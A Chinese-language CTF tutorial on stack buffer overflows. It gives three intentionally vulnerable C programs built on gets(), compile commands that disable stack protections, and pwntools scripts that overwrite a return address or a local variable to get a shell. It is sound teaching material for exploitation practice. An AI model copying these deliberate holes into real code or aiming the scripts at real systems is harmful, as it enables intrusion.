CTF-Pwn 栈溢出实战

3道题目，从入门到进阶，掌握栈溢出漏洞的利用。

1

challenge1 - 简单的gets溢出

入门

源码 (challenge1.c) 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    system("/bin/sh");  // 获取shell的函数
}

int main() {
    char buf[32];  // 32字节的缓冲区
    
    printf("Welcome to Stack Overflow Challenge 1!\n");
    printf("Can you overflow this buffer?\n");
    
    gets(buf);  // 危险！不检查输入长度
    
    return 0;
}
漏洞分析
  • 漏洞点：gets(buf) 不限制输入长度
  • 利用方法：溢出覆盖返回地址，跳转到 win() 函数
  • 溢出量：32字节 + 8字节(Saved RBP) = 40字节后开始覆盖返回地址

编译命令

gcc -no-pie -fno-stack-protector -z execstack -o challenge1 challenge1.c
-no-pie: 禁用地址随机化 | -fno-stack-protector: 禁用栈保护 | -z execstack: 栈可执行

Python 解题脚本 

#!/usr/bin/env python3
from pwn import *

# 启动进程
p = process('./challenge1')

# 构建溢出payload
# 32字节填充 + 8字节覆盖Saved RBP + win函数地址
padding = 32
saved_rbp = 8
win_addr = 0x401156  # win函数的地址，通过objdump或gdb获得

payload = b'A' * (padding + saved_rbp)  # 填满缓冲区并覆盖到返回地址前
payload += p64(win_addr)                 # 覆盖返回地址为win()

# 发送payload
p.sendline(payload)

# 获取shell交互
p.interactive()
脚本解释
  • process('./challenge1') - 本地启动程序进程
  • padding = 32 - 填满buf数组
  • saved_rbp = 8 - 覆盖Saved RBP需要的字节数
  • win_addr - win函数的地址（需要根据实际编译结果确定）
  • p64(win_addr) - 打包成64位地址（小端序）
  • sendline() - 发送payload并换行
  • interactive() - 切换到交互模式，获得shell控制
2

challenge2 - 64位栈溢出

入门

源码 (challenge2.c) 

#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[16];  // 更小的缓冲区
    gets(buf);
    printf("You entered: %s\n", buf);
}

int main() {
    printf("64-bit Stack Overflow Challenge!\n");
    vuln();
    return 0;
}
漏洞分析
  • 漏洞点：gets(buf) 无限读取直到换行
  • 利用方法：16字节buf + 8字节RBP = 24字节后覆盖返回地址
  • 与challenge1区别：缓冲区更小，地址可能不同

编译命令

gcc -no-pie -fno-stack-protector -z execstack -o challenge2 challenge2.c

Python 解题脚本 

#!/usr/bin/env python3
from pwn import *

# 远程版本（如果部署在服务器上）
# p = remote('ip', port)

# 本地版本
p = process('./challenge2')

# 查找win函数地址（动态获取）
elf = ELF('./challenge2')
win_addr = elf.symbols['win']  # 自动获取win函数地址

# 构建payload: 16(buf) + 8(Saved RBP) + win_addr
payload = b'A' * 24
payload += p64(win_addr)

print(f"win address: {hex(win_addr)}")
p.sendline(payload)

p.interactive()
脚本解释
  • elf = ELF('./challenge2') - 加载二进制文件获取符号信息
  • elf.symbols['win'] - 自动获取win函数的真实地址
  • 16 + 8 = 24 - 刚好覆盖到返回地址
  • hex(win_addr) - 打印地址便于调试

challenge3 - 溢出到其他变量

进阶

源码 (challenge3.c) 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int authenticated = 0;  // 全局变量标记

void win() {
    system("/bin/sh");
}

void vuln() {
    char password[32];
    int secret = 0x1234;
    
    printf("Password: ");
    gets(password);
    
    printf("Secret is: 0x%x\n", secret);
    
    if (secret == 0xbeef) {  // 溢出修改secret为此值即可
        printf("Access granted!\n");
        win();
    } else {
        printf("Access denied!\n");
    }
}

int main() {
    vuln();
    return 0;
}
漏洞分析
  • 漏洞点：栈变量越界修改
  • 利用方法：不需要覆盖返回地址，只需修改 secret 变量
  • 溢出量：32字节(password) + 4字节(secret) 覆盖即可
  • 注意：是小端序，0xbeef要写成 \xef\xbe\x00\x00

编译命令

gcc -no-pie -fno-stack-protector -z execstack -o challenge3 challenge3.c

Python 解题脚本 

#!/usr/bin/env python3
from pwn import *

p = process('./challenge3')

# payload结构: 32(password) + 4(secret低地址部分) = 36字节
# 需要将secret修改为0xbeef

payload = b'A' * 32          # 填满password数组
payload += p32(0xbeef)       # 修改secret为0xbeef (小端序)

p.sendline(payload)
p.interactive()
脚本解释
  • p32(0xbeef) - 打包为32位小端序整数，得到 b'\xef\xbe\x00\x00'
  • sendline() - 发送后自动换行，触发 gets() 读取
  • 关键技巧：不是所有溢出都要改返回地址，改变量也能达到目的！
